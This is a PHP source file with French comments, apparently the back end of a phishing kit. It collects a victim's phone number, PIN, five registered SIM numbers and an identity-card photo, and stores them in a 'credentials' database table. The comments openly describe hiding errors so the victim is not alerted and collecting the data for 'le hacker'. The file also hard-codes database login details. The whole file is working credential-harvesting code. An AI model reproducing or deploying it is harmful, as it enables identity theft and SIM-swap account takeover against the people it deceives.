<?php
// Désactiver l'affichage des erreurs PHP pour ne pas alerter la victime
// Ceci est crucial pour un script de phishing afin de rester discret.
ini_set('display_errors', 0);
error_reporting(0);

// --- Configuration de la Base de Données MariaDB ---
// Assurez-vous que ces informations correspondent à votre base de données
define('DB_HOST', 'localhost');
define('DB_NAME', 'ONLY.NBA'); // Remplacez par le nom réel de votre base de données
define('DB_USER', 'nathanaelhacker6NBA'); // Remplacez par votre nom d'utilisateur DB
define('DB_PASS', 'nathanael1209ba'); // Remplacez par votre mot de passe DB

// --- Configuration du Dossier d'Upload des Fichiers ---
// Le hacker doit créer ce dossier et s'assurer qu'il a les permissions d'écriture
// pour l'utilisateur du serveur web (ex: www-data sur Debian/Ubuntu).
$upload_dir = 'uploads/'; // Dossier où les photos seront sauvegardées

// Vérifier et créer le dossier d'upload s'il n'existe pas
// Les permissions 0775 sont généralement sûres pour les dossiers et permettent à www-data d'écrire.
if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0775, true); 
}

// --- FIN Configuration ---


// Vérifier si la requête HTTP est de type POST.
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupération et nettoyage des données POST
    $phoneNumber = isset($_POST['phone_number']) ? htmlspecialchars($_POST['phone_number']) : '';
    $pinCode = isset($_POST['pin_code']) ? htmlspecialchars($_POST['pin_code']) : ''; 
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $timestamp = date('Y-m-d H:i:s');
    
    $readerCardPhotoPath = NULL; // Chemin pour la photo de la carte d'identité

    // --- Collecte et validation des 5 numéros SIM ---
    $simNumbers = [];
    $allSimNumbersProvided = true;
    for ($i = 1; $i <= 5; $i++) {
        $simKey = 'sim_number_' . $i;
        if (isset($_POST[$simKey]) && !empty($_POST[$simKey])) {
            $simNumbers[] = htmlspecialchars($_POST[$simKey]);
        } else {
            $allSimNumbersProvided = false;
            $errorType = 'sim_number_missing'; // Type d'erreur spécifique
            break; // Arrête la boucle dès qu'un numéro manque
        }
    }

    if (!$allSimNumbersProvided) {
        error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: Un ou plusieurs numéros SIM sont manquants ($errorType) pour IP: $ipAddress\n", 3, 'validation_error.log');
        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
        exit();
    }
    $simRegisteredNumbers = implode(', ', $simNumbers); // Concatène les 5 numéros en une seule chaîne


    // --- Validation des champs obligatoires restants ---
    // Vérifier si le numéro de téléphone est fourni et non vide
    if (empty($phoneNumber)) {
        $errorType = 'phone_number_missing'; // Type d'erreur spécifique
        error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: Numéro de téléphone manquant ($errorType) pour IP: $ipAddress\n", 3, 'validation_error.log');
        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
        exit();
    }

    // Vérifier si le PIN est fourni et non vide
    if (empty($pinCode)) {
        $errorType = 'pin_missing'; // Type d'erreur spécifique
        error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: PIN manquant ($errorType) pour IP: $ipAddress\n", 3, 'validation_error.log');
        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
        exit();
    }

    // Vérifier si la photo de la carte d'identité a été uploadée avec succès
    if (!isset($_FILES['reader_card_photo']) || $_FILES['reader_card_photo']['error'] !== UPLOAD_ERR_OK) {
        $errorType = 'photo_upload_error'; // Type d'erreur spécifique
        error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: Photo de carte d'identité manquante ou erreur d'upload ($errorType) pour IP: $ipAddress. Code d'erreur PHP: " . (isset($_FILES['reader_card_photo']) ? $_FILES['reader_card_photo']['error'] : 'Non définie') . "\n", 3, 'validation_error.log');
        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
        exit();
    }


    // --- Gestion de l'upload de la photo de la carte de lecteur/ID ---
    $fileTmpPath = $_FILES['reader_card_photo']['tmp_name'];
    $fileName = $_FILES['reader_card_photo']['name'];
    $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

    // Générer un nom de fichier unique et sécurisé
    $newFileName = sha1(uniqid(rand(), true) . $fileName) . '.' . $fileExtension;
    $destPath = $upload_dir . $newFileName;

    // Vérifier le type de fichier (extension et MIME réel) pour la photo
    $allowedImageExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
    $allowedImageMimeTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
    
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $realMimeType = finfo_file($finfo, $fileTmpPath);
    finfo_close($finfo);

    if (in_array($fileExtension, $allowedImageExtensions) && in_array($realMimeType, $allowedImageMimeTypes)) {
        if (move_uploaded_file($fileTmpPath, $destPath)) {
            $readerCardPhotoPath = $newFileName; // Enregistrer seulement le nom du fichier
        } else {
            $errorType = 'photo_move_failed'; // Type d'erreur spécifique
            error_log("[" . date('Y-m-d H:i:s') . "] Erreur Upload Photo: Déplacement du fichier échoué ($errorType) pour IP: $ipAddress. Code d'erreur PHP: " . $_FILES['reader_card_photo']['error'] . "\n", 3, 'upload_error.log');
            header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
            exit();
        }
    } else {
        $errorType = 'invalid_photo_type'; // Type d'erreur spécifique
        error_log("[" . date('Y-m-d H:i:s') . "] Erreur Upload Photo: Type de fichier ou MIME invalide ($errorType) pour IP: $ipAddress - Ext: " . $fileExtension . ", MIME: " . $realMimeType . "\n", 3, 'upload_error.log');
        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
        exit();
    }


    try {
        // Connexion à la base de données via PDO
        $dsn = 'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4';
        $pdo = new PDO($dsn, DB_USER, DB_PASS);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        // Préparation de la requête SQL pour l'insertion
        $stmt = $pdo->prepare("INSERT INTO credentials (phone_number, sim_registered_numbers, pin_code, reader_card_photo_path, ip_address, timestamp) VALUES (?, ?, ?, ?, ?, ?)");

        // Exécution de la requête avec les données (simRegisteredNumbers est une chaîne concaténée)
        $stmt->execute([$phoneNumber, $simRegisteredNumbers, $pinCode, $readerCardPhotoPath, $ipAddress, $timestamp]);

    } catch (PDOException $e) {
        $errorType = 'database_error'; // Type d'erreur spécifique
        // En cas d'erreur de base de données, enregistrer l'erreur pour le hacker
        $errorLogFile = 'db_error.log';
        file_put_contents($errorLogFile, "[" . date('Y-m-d H:i:s') . "] Erreur DB (process_verification): " . $e->getMessage() . " ($errorType)\n", FILE_APPEND);
        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
        exit();
    }

    // Rediriger la victime vers une page de succès
    header('Location: success.html'); // Assurez-vous que 'success.html' est le bon chemin
    exit();
} else {
    // Si le script est accédé directement, afficher une page d'erreur 404
    http_response_code(404);
    exit('Not Found');
}
?>
